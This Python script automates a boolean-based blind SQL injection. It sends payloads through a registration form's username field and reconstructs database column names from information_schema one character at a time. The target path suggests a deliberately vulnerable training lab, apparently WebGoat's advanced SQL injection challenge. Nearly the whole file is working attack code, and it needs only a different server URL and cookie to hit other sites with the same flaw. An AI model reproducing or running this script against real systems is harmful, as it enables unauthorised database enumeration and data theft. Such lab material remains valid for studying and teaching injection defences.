import json
import requests
from typing import List
import os
import sys

# Add the parent directory to the Python path for importing config
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Config

# Load configurations
SERVER_URL = Config.SERVER_URL
SESSION_COOKIE = Config.SESSION_COOKIE

# Function to discover all column names for provided table names through SQL injection
def discover_columns_for_tables(table_names: List[str]):
    # Character set to try for column name discovery
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'

    # Headers for the HTTP request (include session ID)
    headers = {
        'Cookie': SESSION_COOKIE,
    }

    # Function to check if a specific character exists at a given column name index for a particular table
    def does_column_character_exist(guess_char, char_position, target_table, column_offset):
        # SQL injection payload to extract the column name one character at a time
        injection_payload = "' OR (SELECT substring(column_name, {}, 1) FROM information_schema.columns WHERE table_name = '{}' LIMIT 1 OFFSET {}) = '{}' --".format(
            char_position, target_table, column_offset, guess_char
        )

        # Data to be sent in the registration form (payload in the username field)
        request_data = {
            'username_reg': injection_payload,
            'email_reg': 'tom@gmail.com',
            'password_reg': 'x',
            'confirm_password_reg': 'x'
        }

        try:
            # Sending PUT request with payload to the target server
            response = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=request_data)
            response.raise_for_status()  # Check for HTTP errors
        except requests.RequestException as e:
            print(f"Request error: {e}")
            return False

        try:
            # Attempt to parse the response as JSON
            response_json = json.loads(response.text)
        except json.JSONDecodeError:
            print("Failed to decode the server response.")
            return False

        # Return True if the feedback indicates that the guessed character was correct
        return "already exists" in response_json.get('feedback', '')

    # Function to retrieve all columns for a particular table
    def get_columns_for_table(target_table):
        columns_list = []
        column_offset = 0

        # Loop through all potential column names for the table
        while True:
            column_name = ''
            char_position = 1  # Character position within the column name

            # Discover characters of the column name
            while True:
                character_found = False
                for char in charset:
                    if does_column_character_exist(char, char_position, target_table, column_offset):
                        column_name += char
                        char_position += 1
                        character_found = True
                        break

                # Break out if no character matches the current position
                if not character_found:
                    break

            # If a valid column name was found, add it to the list
            if column_name:
                print(f"Column found in {target_table}: {column_name}")
                columns_list.append(column_name)
                column_offset += 1
            else:
                # Stop when no more columns are found
                break

        return columns_list

    # Process each table and find its columns
    column_data = {}
    for table in table_names:
        print(f"Processing table: {table}")
        columns = get_columns_for_table(table)
        if columns:
            column_data[table] = columns

    print("All tables have been processed successfully.")
    return column_data

# Wrapper function for easier invocation
def discover_columns(table_names: List[str]):
    """
    Wrapper function to discover columns for specified tables.

    :param table_names: List of table names to process
    :return: Dictionary with table names as keys and their columns as values
    """
    try:
        if not table_names:
            raise ValueError("Table names list is empty.")

        result = discover_columns_for_tables(table_names)
        return {"status": "success", "discovered_columns": result}

    except Exception as e:
        return {"status": "error", "message": str(e)}
